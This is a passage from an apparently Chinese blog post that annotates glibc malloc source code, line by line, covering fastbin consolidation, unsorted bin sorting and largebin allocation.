  */</span></span><br><span class="line"></span><br><span class="line">    maxfb = &amp;fastbin(av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin(av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      p = atomic_exchange_acq(fb, <span class="number">0</span>); <span class="comment">// p=fb,fb++</span></span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123; <span class="comment">// 释放快桶子p上挂着的所有堆块</span></span><br><span class="line">          check_inuse_chunk(av, p);</span><br><span class="line">          nextp = p-&gt;fd; <span class="comment">// 先取后继</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">          size = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA); <span class="comment">// 撤销flag</span></span><br><span class="line">          nextchunk = chunk_at_offset(p, size);            <span class="comment">// 物理上相邻的下一个堆块</span></span><br><span class="line">          nextsize = chunksize(nextchunk);   </span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!prev_inuse(p))<span class="comment">//向前合并</span></span><br><span class="line">          &#123;</span><br><span class="line">            prevsize = p-&gt;prev_size;</span><br><span class="line">            size += prevsize;</span><br><span class="line">            p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));<span class="comment">//取物理上前一个相邻的堆块基址,作为合并堆块的基址</span></span><br><span class="line">            unlink(av, p, bck, fwd);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (nextchunk != av-&gt;top)<span class="comment">//如果后面和topchunk相邻则和topchunk合并,否则尝试向后合并</span></span><br><span class="line">          &#123;</span><br><span class="line">            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!nextinuse)</span><br><span class="line">            &#123;</span><br><span class="line">              size += nextsize;</span><br><span class="line">              unlink(av, nextchunk, bck, fwd);<span class="comment">//如果物理上后面相邻的堆块没在使用则向后合并</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            first_unsorted = unsorted_bin-&gt;fd;<span class="comment">//取第一个unsorted_bin上悬挂的堆块</span></span><br><span class="line">            unsorted_bin-&gt;fd = p;<span class="comment">//头插法</span></span><br><span class="line">            first_unsorted-&gt;bk = p;<span class="comment">//将p链接到unsorted_bin和p之间</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range(size))<span class="comment">//如果这个合并堆块在largebin范围内则初始化其nextsize指针</span></span><br><span class="line">            &#123;</span><br><span class="line">              p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            set_head(p, size | PREV_INUSE);</span><br><span class="line">            p-&gt;bk = unsorted_bin;</span><br><span class="line">            p-&gt;fd = first_unsorted;</span><br><span class="line">            set_foot(p, size);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            size += nextsize;</span><br><span class="line">            set_head(p, size | PREV_INUSE);<span class="comment">//p后面就是topchunk,p合并到topchunk</span></span><br><span class="line">            av-&gt;top = p;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">while</span> ((p = nextp) != <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);<span class="comment">//遍历整个fastbin,直到fastbin桶子头哨兵maxfb</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    malloc_init_state(av);<span class="comment">//初始化堆</span></span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="unsortedbin区分配">unsortedbin区分配</h4>
<h5 id="unsortedbin尝试分配-与-归类">unsortedbin尝试分配 与 归类</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av))<span class="comment">//检查unsortedbin中是否确实有堆块,有则从unsortedbin中拿下第一个堆块</span></span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;<span class="comment">//后继</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect(victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr(check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                        chunk2mem(victim), av);</span><br><span class="line">      size = chunksize(victim);<span class="comment">//根据size字段获取victim的大小</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">         only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">         runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">         exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">         no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(nb) &amp;&amp;<span class="comment">//如果是一个smallbin的分配申请</span></span><br><span class="line">          bck == unsorted_chunks(av) &amp;&amp;<span class="comment">//bck=victim-&gt;bk如果这个判断通过,说明刚从unsortedbin中拆下的堆块victim是unsoreted中唯一的堆块</span></span><br><span class="line">          victim == av-&gt;last_remainder &amp;&amp;<span class="comment">//如果victim是最近一次分配过的堆块,最近使用的堆块页面可能还在内存中,因此有这种优化</span></span><br><span class="line">          (<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE))<span class="comment">//如果这个victim堆块满足大小要求</span></span><br><span class="line">      &#123;<span class="comment">//这个victim通过了考察,下面将其分割,将满足大小要求的部分给用户,剩下的部分再放回unsortedbin</span></span><br><span class="line">        <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">        remainder_size = size - nb;<span class="comment">//剩余大小</span></span><br><span class="line">        remainder = chunk_at_offset(victim, nb);<span class="comment">//victim的前半部分将要分出去给用户,后面的剩下,remainder是剩下部分的基地址</span></span><br><span class="line">        unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;<span class="comment">//更新unsortedbin中这个唯一堆块的剩余状态</span></span><br><span class="line">        av-&gt;last_remainder = remainder;<span class="comment">//剩余堆块记为最近使用</span></span><br><span class="line">        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);<span class="comment">//设置前后指针都为unsortedbin桶子</span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(remainder_size))<span class="comment">//如果剩下的部分属于largebin范围,则初始化两个指针</span></span><br><span class="line">        &#123;</span><br><span class="line">          remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                             (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head(remainder, remainder_size | PREV_INUSE);<span class="comment">//因为前块被分配,因此remainder的prev_inuse置1</span></span><br><span class="line">        set_foot(remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);<span class="comment">//p=victim+0x10指向data区域</span></span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">      unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = unsorted_chunks(av);<span class="comment">//将bin从unsortedbin中拿出来,然后将其前后驱连接</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (size == nb)<span class="comment">//如果尝试分配的大小,恰好和这个unsortedbin堆块一样大则分配之</span></span><br><span class="line">      &#123;</span><br><span class="line">        set_inuse_bit_at_offset(victim, size);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">          victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(size))<span class="comment">//如果这个刚摘下来的unsortedbin堆块属于smallbin范围,计算好新的前后邻居</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim_index = smallbin_index(size);</span><br><span class="line">        bck = bin_at(av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span><span class="comment">//否则说明这unsortedbin堆块属于largebin范围,计算好新的前后邻居</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim_index = largebin_index(size);</span><br><span class="line">        bck = bin_at(av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">        <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">          assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>)(bck-&gt;bk-&gt;size))</span><br><span class="line">          &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>)size &lt; fwd-&gt;size)</span><br><span class="line">            &#123;</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)size == (<span class="type">unsigned</span> <span class="type">long</span>)fwd-&gt;size)</span><br><span class="line">              <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">              fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//结算,前面不管是largebin还是smallbin,都已经计算好了前后邻居bck,fwd,在此将诸位连接</span></span><br><span class="line">      mark_bin(av, victim_index);<span class="comment">//标记binmap</span></span><br><span class="line">      victim-&gt;bk = bck;</span><br><span class="line">      victim-&gt;fd = fwd;</span><br><span class="line">      fwd-&gt;bk = victim;</span><br><span class="line">      bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS 10000</span></span><br><span class="line">      <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)<span class="comment">//顶多合并10000次,太多次合并会导致本次请求响应太慢</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h5 id="largebin申请">largebin申请</h5>
<p>如果到此还没有返回,也就是还没有申请到堆块下面再尝试使用largebin申请</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (!in_smallbin_range(nb))<span class="comment">//如果是一个largebin的请求</span></span><br><span class="line"> &#123;</span><br><span class="line">   bin = bin_at(av, idx);<span class="comment">//取桶子头</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">   <span class="keyword">if</span> ((victim = first(bin)) != bin &amp;&amp;</span><br><span class="line">       (<span class="type">unsigned</span> <span class="type">long</span>)(victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb))</span><br><span class="line">   &#123;<span class="comment">//first(bin)=bin-&gt;fd,可以看出bin-&gt;fd应该是该桶子中最大的一个堆块,然后顺着fd指针越来越小</span></span><br><span class="line">       <span class="comment">//如果最大的堆块都不满足nb的需求,显然再往后找更小的无意义,因此首先需要判断最大的堆块是否能满足要求,</span></span><br><span class="line"><span class="comment">//当这个前提条件满足时,再向后找最佳适配的堆块</span></span><br><span class="line">     victim = victim-&gt;bk_nextsize;<span class="comment">//bk_nextsize是下一个比当前victim小的堆块,victim-&gt;bk可能和victim一样大,但是victim-&gt;bk_nextsize要么是桶子头,要么一定比当前堆块小</span></span><br><span class="line">     <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>)(size = chunksize(victim)) &lt;</span><br><span class="line">             (<span class="type">unsigned</span> <span class="type">long</span>)(nb)))</span><br><span class="line">       victim = victim-&gt;bk_nextsize;<span class="comment">//从小开始遍历直到第一个大于等于nb大小的堆块</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">        list does not have to be rerouted.  */</span></span><br><span class="line">     <span class="keyword">if</span> (victim != last(bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">       victim = victim-&gt;fd;<span class="comment">//避免移除跳表的最开始一个导致变更指针,首先尝试寻找该大小的堆块是否有第二块,如果有则放过跳表头</span></span><br><span class="line">		</span><br><span class="line">     remainder_size = size - nb;<span class="comment">//victim块比较抠,只分配nb大小左右,多余的不给</span></span><br><span class="line">     unlink(av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Exhaust */</span></span><br><span class="line">     <span class="keyword">if</span> (remainder_size &lt; MINSIZE)<span class="comment">//如果发现victim分割后的剩余部分都是下脚料就不抠了</span></span><br><span class="line">     &#123;</span><br><span class="line">       set_inuse_bit_at_offset(victim, size);</span><br><span class="line">       <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">         victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">/* Split */</span></span><br><span class="line">     <span class="keyword">else</span><span class="comment">//否则victim剩余部分放到unsortedbin</span></span><br><span class="line">     &#123;</span><br><span class="line">       remainder = chunk_at_offset(victim, nb);<span class="comment">//取victim切割nb字节之后的剩余部分</span></span><br><span class="line">       <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">          have to perform a complete insert here.  */</span></span><br><span class="line">       bck = unsorted_chunks(av);</span><br><span class="line">       fwd = bck-&gt;fd;</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">       &#123;</span><br><span class="line">         errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">         <span class="keyword">goto</span> errout;</span><br><span class="line">       &#125;</span><br><span class="line">       remainder-&gt;bk = bck;<span class="comment">//头插法</span></span><br><span class="line">       remainder-&gt;fd = fwd;</span><br><span class="line">       bck-&gt;fd = remainder;</span><br><span class="line">       fwd-&gt;bk = remainder;</span><br><span class="line">       <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">       &#123;</span><br><span class="line">         remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;<span class="comment">//如果剩余大小还是largebin大小,则此时预先将指针清零</span></span><br><span class="line">         remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">       set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">       set_foot(remainder, remainder_size);</span><br><span class="line">     &#125;</span><br><span class="line">     check_malloced_chunk(av, victim, nb);</span><br><span class="line">     <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">     alloc_perturb(p, bytes);</span><br><span class="line">     <span class="keyword">return</span> p;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h5 id="后续largebin申请">后续largebin申请</h5>
<p>如果到此还没有分配,说明当前largebin里面没有找到何时的,那么向后面的largebin桶子中找</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">   bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">   (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">   that fits is selected.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment">   The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">   when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">++idx;					<span class="comment">//取下一个桶子的下标</span></span><br><span class="line">bin = bin_at(av, idx);	<span class="comment">//首先查binmap,看看下一个桶子是否确实有空闲堆块</span></span><br><span class="line">block = idx2block(idx);</span><br><span class="line"><span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">bit = idx2bit(idx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">  <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)<span class="comment">//如果bit&gt;map只可能是map=0,也就是当前block是空的</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">        <span class="keyword">goto</span> use_top;<span class="comment">//如果发现block遍历了4个block,全是空的,也就是largebin空了,直接使用top_chunk分配</span></span><br><span class="line">    &#125; <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);<span class="comment">//跳过所有空的largebin</span></span><br><span class="line"></span><br><span class="line">    bin = bin_at(av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">    bit = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">  <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)<span class="comment">//尝试找一个map对应block中有堆块的桶子</span></span><br><span class="line">  &#123;</span><br><span class="line">    bin = next_bin(bin);</span><br><span class="line">    bit &lt;&lt;= <span class="number">1</span>;<span class="comment">//左移也就是往largebin更大的方向找</span></span><br><span class="line">    assert(bit != <span class="number">0</span>);</span><br><span class="line">  &#125;<span class="comment">//退出循环时,bin对应的桶子中一定有堆块</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">  victim = last(bin);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">  <span class="keyword">if</span> (victim == bin)<span class="comment">//检查是否该bin中至少有一个堆块,这是因为map是懒修改的</span></span><br><span class="line">  &#123;<span class="comment">//也就是说,map中标记有的不一定有,但是map中标记没有的一定没有</span></span><br><span class="line">    av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">      <span class="comment">//本桶子中确实没有,但也不是没有功劳,起码可以修改map,下一次查找一定不会查本桶子</span></span><br><span class="line">    bin = next_bin(bin);</span><br><span class="line">    bit &lt;&lt;= <span class="number">1</span>;<span class="comment">//继续向更大的largebin桶子寻找</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span><span class="comment">//本桶子中确实有至少一个堆块</span></span><br><span class="line">  &#123;</span><br><span class="line">    size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">    assert((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb));</span><br><span class="line"></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* unlink */</span></span><br><span class="line">    unlink(av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Exhaust */</span></span><br><span class="line">    <span class="keyword">if</span> (remainder_size &lt; MINSIZE)<span class="comment">//下脚料一起送人</span></span><br><span class="line">    &#123;</span><br><span class="line">      set_inuse_bit_at_offset(victim, size);</span><br><span class="line">      <span class="keyword">if</span> (av != 